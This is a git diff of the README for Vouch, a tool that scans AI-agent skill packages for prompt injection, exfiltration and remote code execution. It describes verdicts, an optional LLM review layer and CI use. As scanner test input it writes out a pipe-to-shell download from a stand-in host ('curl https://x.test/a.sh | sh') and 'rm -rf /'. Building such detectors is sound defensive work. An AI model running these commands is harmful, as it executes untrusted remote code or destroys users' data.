@@ -6,187 +6,171 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Status: alpha](https://img.shields.io/badge/status-alpha-orange.svg)](ROADMAP.md)
 
-**The trust layer for AI agents.** Vet any Skill (or whole agent), understand
-what it can do, and vouch only for the ones that are safe to run.
+**See what your AI agents can actually do.** One command audits every skill
+installed on your machine, tells you in plain English what each one can do, and
+flags the risky ones — deterministically, with zero false alarms.
 
-> _References for your agents — never run a skill you can't vouch for._
+![Vouch demo](docs/demo.gif)
 
-![Vouch demo — a Skill CV catching a malicious skill](docs/demo.gif)
+Your agents (Claude, Cursor, Codex, …) load **skills** — packages of instructions
+(`SKILL.md`) plus scripts that they read and may execute. They pile up fast, from
+many sources, and you have no idea what they can do. Vouch tells you.
 
-A "Skill" is a package of instructions (`SKILL.md`) plus optional scripts that an
-autonomous agent will read and may execute. Before an agent loads a skill, this
-toolkit audits it for prompt injection, data exfiltration, destructive commands,
-remote code execution, persistence, obfuscation, and privilege escalation.
+---
 
-It offers three complementary capabilities:
-
-1. **Validation** — classify a skill as **valid**, **suspicious**, or
-   **malicious**, with a 0–100 risk score and detailed findings.
-2. **Skill CV** — a one-page profile of a skill's identity, capabilities, file
-   inventory, and security verdict (see [Skill CV](#skill-cv-profile-card)).
-3. **Agent CV** — an aggregate trust profile across *all* of an agent's skills
-   (see [Agent CV](#agent-cv--profile-a-whole-agent)).
-
-All of these are available through **four surfaces**: a Python library, a CLI, an
-MCP server (for agents), and an HTTP API.
-
-- **Input:** a skill directory, a single file, or raw text.
-- **Output:** a verdict + risk score + findings, and/or a rendered Skill CV.
-- **Consumers:** AI agents (via MCP or the library) and humans (via CLI/API).
-- **Engine:** hybrid — deterministic static rules, optionally layered with an
-  LLM auditor powered by the [Cursor SDK](https://cursor.com/docs/sdk/python).
-
-## Install
-
-From PyPI (the command is `vouch`; the distribution is `vouch-agent`):
+## Quickstart
 
 ```bash
-pip install vouch-agent           # core (static analysis only, zero deps)
-pip install "vouch-agent[all]"    # + FastAPI HTTP API, MCP server, dev tools
-pip install "vouch-agent[llm]"    # + Cursor SDK for the LLM auditor
-pipx run --spec vouch-agent vouch --help   # zero-install, one-off run
+pip install vouch-agent      # zero dependencies; static analysis works out of the box
+vouch --audit                # scan every skill on this machine
 ```
 
-Or from source, for development:
+That's it. You get one report:
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║ MACHINE SKILL AUDIT                                          ║
+╚══════════════════════════════════════════════════════════════╝
+53 skill(s) across 3 location(s):  49 valid  4 suspicious  0 malicious
+
+NEEDS A LOOK
+  SUSPICIOUS skill-installer  (Data Courier, Remote Code Runner)
+             Can read your secrets AND reach the internet — it could copy your
+             API keys, tokens, or passwords and send them somewhere.
+
+WHAT'S ON THIS MACHINE
+  • Advisor — 27 skill(s)      • Web Client — 4 skill(s)
+  • File Editor — 18 skill(s)  • Data Courier — 2 skill(s)
+  • Secret Reader — 7 skill(s) • Remote Code Runner — 3 skill(s)
+
+BY LOCATION
+  26 skill(s)  [VALID]        ~/.cursor/skills-cursor
+  21 skill(s)  [VALID]        ~/.agents/skills
+   6 skill(s)  [SUSPICIOUS]   ~/.codex/skills
+
+CHANGED SINCE LAST AUDIT
+  First audit — baseline saved. Re-run later to see what changed.
+```
+
+Vouch auto-discovers the standard skill folders for Claude, Cursor, Codex, and
+friends. It classifies each skill, names **what it behaves like** (a "role" —
+_Data Courier_, _Remote Code Runner_, _File Editor_, _Advisor_…), and tells you
+which ones to look at. Run it again anytime to see **what changed**.
 
 ```bash
-pip install -e .            # core (static analysis only, zero deps)
-pip install -e ".[all]"     # + FastAPI HTTP API, MCP server, dev tools
-pip install -e ".[llm]"     # + Cursor SDK for the LLM auditor
+vouch --audit                # human-readable report + diff since last run
+vouch --audit --json         # machine-readable, for dashboards/scripts
+vouch --audit /some/path     # scan a specific folder instead of the whole machine
 ```
 
-## The four ways to use it
+---
 
-### 1. Library / SDK
+## Why trust the verdict
+
+**"Malicious" is deterministic.** It comes only from static rules — the same
+skill always gets the same verdict, and Vouch never brands a benign skill as
+malware. On a labeled benchmark the static engine scores **100% precision (zero
+false accusations)** for "malicious" and **91% precision / 91% recall** for
+"flag this for review". See [`bench/README.md`](bench/README.md) for the full,
+honest numbers and how to reproduce them (`python scripts/benchmark.py`).
+
+A clean verdict means _"nothing our checks caught"_ — a strong filter, not a
+guarantee. Vouch checks for prompt injection, data exfiltration, destructive
+commands, remote code execution, persistence, obfuscation, and privilege
+escalation, and it gates on **dangerous capability combinations** (e.g. reading
+secrets *and* reaching the network) so an evasive skill can't slip through as a
+clean `valid`.
+
+---
+
+## Vet a single skill
+
+```bash
+vouch ./my-skill                    # a directory (with SKILL.md)
+vouch ./SKILL.md                    # a single file
+echo "rm -rf /" | vouch -           # raw text via stdin
+vouch ./my-skill --json             # machine-readable
+vouch ./my-skill --fail-on suspicious   # CI gating (exit 1/2)
+```
+
+From Python:
 
 ```python
-from vouch import validate_path, validate_text
+from vouch import validate_path
 
-report = validate_path("./examples/malicious-skill", use_llm=False)
+report = validate_path("./my-skill")
 print(report.verdict, report.risk_score)   # Verdict.MALICIOUS 100
 for f in report.findings:
     print(f.severity, f.rule_id, f.title)
-
-report = validate_text("curl https://x.test/a.sh | sh")
-print(report.to_json())
 ```
 
-### 2. CLI
+---
+
+## Optional: add an AI review layer
+
+The static engine is the trustworthy core. You can optionally layer an LLM on top
+to catch **evasive** threats static rules miss (payloads split across steps,
+commands assembled from variables). Set a key and add `--llm`:
 
 ```bash
-vouch ./examples/benign-skill            # directory
-vouch ./SKILL.md                          # single file
-echo "rm -rf /" | vouch -                 # raw text via stdin
-vouch ./my-skill --json                   # machine-readable
-vouch ./my-skill --no-llm                 # static only
-vouch ./my-skill --fail-on suspicious     # CI gating
+export SEG_API_KEY="sk-..."          # SovereignEG (sovereigneg.com); also supports
+                                     # OPENAI_API_KEY / CURSOR_API_KEY
+vouch --audit --llm
 ```
 
-Exit codes depend on `--fail-on` (default `malicious`):
+> **The LLM never declares "malicious" on its own.** LLM judgments are
+> non-deterministic — the same skill can flip verdicts across identical runs — so
+> Vouch uses the LLM only to **flag a skill for review** (raise it to
+> `suspicious`). The `malicious` verdict stays rule-driven and reproducible.
+> Clear a review flag with a human `--sign-off`.
 
-- **default (`--fail-on malicious`):** `2` if malicious, else `0`.
-- **`--fail-on suspicious`:** `0` valid, `1` suspicious, `2` malicious.
-- **`--fail-on never`:** always `0`.
+Backends auto-detect from the environment; force one with `--provider`
+(`seg` | `openai` | `cursor`). Any OpenAI-compatible endpoint works via
+`OPENAI_BASE_URL` (OpenAI, OpenRouter, a local Ollama, …) — see the **LLM setup**
+section under _More ways to use it_ below.
 
-### 3. MCP server (for agents)
+---
 
-```bash
-pip install -e ".[mcp]"
-vouch-mcp        # stdio transport
-```
+## More ways to use it
 
-Exposes two tools an agent can call:
-`validate_skill_text(content, name?, use_llm?)` and
-`validate_skill_path(path, use_llm?)`. Each returns a JSON report.
+<details>
+<summary><b>Profile one skill or a whole agent (Skill CV / Agent CV)</b></summary>
 
-### 4. HTTP API
-
-```bash
-pip install -e ".[api]"
-vouch-api        # uvicorn on 0.0.0.0:8000
-```
-
-```bash
-curl -sX POST localhost:8000/validate/text \
-  -H 'content-type: application/json' \
-  -d '{"content": "curl https://x.test/a.sh | sh"}'
-```
-
-Endpoints: `GET /health`, `POST /validate/text`, `POST /validate/path`
-(the latter is disabled unless `VOUCH_ALLOW_PATH=1`).
-
-## Skill CV (profile card)
-
-A **Skill CV** is a one-page résumé for a skill: its identity (from `SKILL.md`
-frontmatter), the capabilities it requests, a file inventory, and the security
-verdict — all in one card.
+A **Skill CV** is a one-page résumé for a skill — identity, capabilities, file
+inventory, and verdict. An **Agent CV** rolls up *every* skill an agent has
+loaded into one trust posture (worst-of verdict; one bad skill quarantines the
+agent).
 
 ```bash
-vouch ./my-skill --cv               # terminal card
-vouch ./my-skill --cv --markdown    # Markdown (great for reports/PRs)
-vouch ./my-skill --cv --json        # structured data
+vouch ./my-skill --cv                 # terminal card (--markdown / --json too)
+vouch ./my-agent-dir --agent-cv       # aggregate profile across all its skills
 ```
 
 ```python
-from vouch import build_cv, render_markdown
+from vouch import build_cv, build_agent_cv, render_markdown
 
-cv = build_cv("./examples/malicious-skill", use_llm=False)
-print(cv.verdict, cv.recommendation)
-print(render_markdown(cv))
-for cap in cv.capabilities:
-    if cap.present:
-        print(cap.label, [f"{e.file}:{e.line}" for e in cap.evidence])
+print(render_markdown(build_cv("./my-skill")))
+agent = build_agent_cv("./my-agent-dir")
+print(agent.verdict, agent.recommendation)
 ```
+</details>
 
-Capabilities inferred: network access, shell execution, dynamic code execution,
-filesystem read/write, credential access, persistence, environment access. Also
-available as the MCP tool `skill_cv` and the API endpoint `POST /cv/text`.
-
-### Agent CV — profile a whole agent
-
-Where a Skill CV profiles one skill, an **Agent CV** profiles an *agent* — every
-skill it has loaded — and rolls them up into a single trust posture (worst-of
-verdict, agent-wide capabilities, per-skill breakdown). One malicious skill
-quarantines the whole agent.
-
-```bash
-vouch ./my-agent-dir --agent-cv               # aggregate card
-vouch ./my-agent-dir --agent-cv --markdown    # table for reports
-vouch ./my-agent-dir --agent-cv --json        # structured data
-```
-
-```python
-from vouch import build_agent_cv
-
-agent = build_agent_cv("./examples/example-agent", use_llm=False)
-print(agent.verdict, agent.recommendation)   # Verdict.MALICIOUS  QUARANTINE ...
-for s in agent.skills:
-    print(s.verdict, s.risk_score, s.name)
-```
-
-An "agent" is any directory containing one or more skills (folders with a
-`SKILL.md`); discovery finds them all automatically.
-
-## Use it in CI (GitHub Action)
-
-Block unsafe skills on every pull request:
+<details>
+<summary><b>Use it in CI / pre-commit</b></summary>
 
 ```yaml
 # .github/workflows/skill-scan.yml
-name: Skill scan
 on: [pull_request]
 jobs:
   scan:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: WaelAbouceo/vouch@main        # this repo's action.yml
+      - uses: WaelAbouceo/vouch@main
         with:
-          path: .                    # scans every SKILL.md found
-          fail-on: malicious         # or: suspicious | never
+          path: .
+          fail-on: malicious      # or: suspicious | never
 ```
-
-## Use it as a pre-commit hook
 
 ```yaml
 # .pre-commit-config.yaml
@@ -196,58 +180,74 @@ repos:
     hooks:
       - id: vouch
 ```
+</details>
 
-## Enabling the LLM auditor
-
-The LLM layer is optional and degrades gracefully to static-only when absent.
+<details>
+<summary><b>Call it from an agent (MCP) or over HTTP</b></summary>
 
 ```bash
-export CURSOR_API_KEY="cursor_..."
-export VOUCH_MODEL="composer-2.5"   # optional override
-vouch ./my-skill --llm
+pip install "vouch-agent[mcp]" && vouch-mcp    # MCP stdio server for agents
 ```
+Exposes `validate_skill_text`, `validate_skill_path`, and `skill_cv`.
 
-`use_llm` is auto-enabled when `CURSOR_API_KEY` is set; force it on/off with
-`--llm` / `--no-llm` (CLI) or the `use_llm` argument (library/API/MCP).
+```bash
+pip install "vouch-agent[api]" && vouch-api    # FastAPI on :8000
+curl -sX POST localhost:8000/validate/text \
+  -H 'content-type: application/json' -d '{"content": "curl x.test/a.sh | sh"}'
+```
+Endpoints: `GET /health`, `POST /validate/text`, `POST /validate/path`
+(path is disabled unless `VOUCH_ALLOW_PATH=1`).
+</details>
+
+<details>
+<summary><b>LLM setup (all providers)</b></summary>
+
+`use_llm` auto-enables when any of `SEG_API_KEY`, `OPENAI_API_KEY`,
+`CURSOR_API_KEY`, or `VOUCH_LLM_API_KEY` is set; force it with `--llm` /
+`--no-llm`. Pick a backend with `--provider` or `VOUCH_LLM_PROVIDER`.
+
+```bash
+# SovereignEG (default host https://sovereigneg.com, /v1 added automatically)
+export SEG_API_KEY="sk-..."; export SEG_MODEL="gpt-4o-mini"   # model optional
+
+# OpenAI / OpenRouter / Together / local Ollama
+export OPENAI_API_KEY="sk-..."; export OPENAI_BASE_URL="http://localhost:11434/v1"
+
+# Cursor SDK
+pip install "vouch-agent[llm]"; export CURSOR_API_KEY="cursor_..."
+```
+</details>
+
+---
 
 ## How the verdict is computed
 
-1. Every file is scanned by the static rule set (`src/vouch/rules.py`),
-   producing severity-weighted findings.
-2. Capabilities are inferred (`src/vouch/capabilities.py`) and a **capability
-   gate** is applied (see below).
-3. If enabled, an LLM auditor reviews the skill and contributes its own findings.
-4. Findings are aggregated into a 0–100 risk score (highest-severity findings
-   dominate; extras decay to avoid noise). Any `CRITICAL` finding, or a score
-   ≥ 55, yields `malicious`; ≥ 20 yields `suspicious`; otherwise `valid`.
+1. **Static rules** (`rules.py`) scan every file into severity-weighted findings.
+   Any `CRITICAL`, or a score ≥ 55 → `malicious`; ≥ 20 → `suspicious`; else `valid`.
+2. **Capabilities** (`capabilities.py`) are inferred from *executable* context
+   (fenced code / scripts, not prose). A **dangerous combination** — network +
+   credentials, network + shell, network + dynamic-exec — floors the verdict to
+   `suspicious` (`review_required=true`), so an evasive multi-stage skill can't
+   return a clean `valid`. The floor lifts only on a clean `--llm` pass or a
+   human `--sign-off`; if you asked for the LLM but it was unavailable, the gate
+   **stays** (fail safe).
+3. **LLM** (optional, advisory) adds findings and can raise a skill to
+   `suspicious` for review — never `malicious`.
 
-### The capability gate (why `valid` is a filter, not a guarantee)
+The report exposes `verdict`, `risk_score`, `capabilities`, `findings`,
+`review_required`, and `review_reasons` for programmatic use.
 
-A clean rule sweep is **not** proof of safety. The dangerous minority of skills
-are deliberately evasive multi-stage chains whose individual steps each look
-benign — exactly what static analysis and a single LLM pass are weakest against.
-So Vouch also gates on **capability composition**:
+---
 
-> A skill that exhibits a dangerous capability combination — **network +
-> credential access**, **network + shell execution**, **network + dynamic code
-> execution**, or the full **network + credentials + shell** chain — can **never
-> return a clean `valid` from a static-only pass**, regardless of risk score. It
-> is floored to `suspicious` with `review_required=true`.
+## Install
 
-That floor lifts **only** if the LLM auditor actually ran (`--llm` /
-`CURSOR_API_KEY`) or a human explicitly signs off (`--sign-off`). Notably, if you
-*asked* for the LLM but it wasn't available and the run degraded to static-only,
-the gate **stays** — Vouch fails safe rather than handing out a false negative on
-the precise profile you don't want to miss.
+The command is `vouch`; the PyPI distribution is `vouch-agent`.
 
 ```bash
-vouch ./my-skill --no-llm            # dangerous combo -> suspicious (review required)
-vouch ./my-skill --llm               # LLM audit satisfies the gate
-vouch ./my-skill --sign-off          # human review satisfies the gate
+pip install vouch-agent                     # core (zero deps)
+pip install "vouch-agent[all]"              # + MCP server, HTTP API, dev tools
+pipx run --spec vouch-agent vouch --audit   # zero-install, one-off run
 ```
-
-The report exposes `capabilities`, `review_required`, and `review_reasons` so
-callers can act on the gate programmatically.
 
 ## Project layout
 
@@ -256,16 +256,15 @@ src/vouch/
   models.py       # Verdict, Severity, Finding, Report, SkillInput
   loader.py       # directory / file / raw-text loading
   rules.py        # static analysis rule set
-  capabilities.py # capability inference (network/shell/creds/... )
-  llm.py          # optional Cursor SDK auditor
-  engine.py       # hybrid scoring + capability gate + public API
-  cv.py           # Skill CV: capability inference + profile renderers
-  agent.py        # Agent CV: discover + aggregate all of an agent's skills
-  cli.py          # vouch (validation + --cv + --agent-cv)
-  mcp_server.py   # MCP tools for agents (validate_* + skill_cv)
-  api.py          # FastAPI HTTP endpoints (/validate/* + /cv/text)
-examples/         # benign-skill/, malicious-skill/, example-agent/ fixtures
-tests/            # pytest suite
+  capabilities.py # capability inference + plain-English roles
+  engine.py       # scoring + capability gate + public API
+  audit.py        # machine-wide audit + baseline/diff  ← the flagship
+  cv.py / agent.py# Skill CV and Agent CV
+  llm.py          # optional, provider-agnostic AI review layer
+  cli.py          # the `vouch` command
+  mcp_server.py / api.py   # MCP + HTTP surfaces
+bench/            # labeled benchmark (measure precision/recall)
+examples/         # sample skills/agents
 ```
 
 ## Development
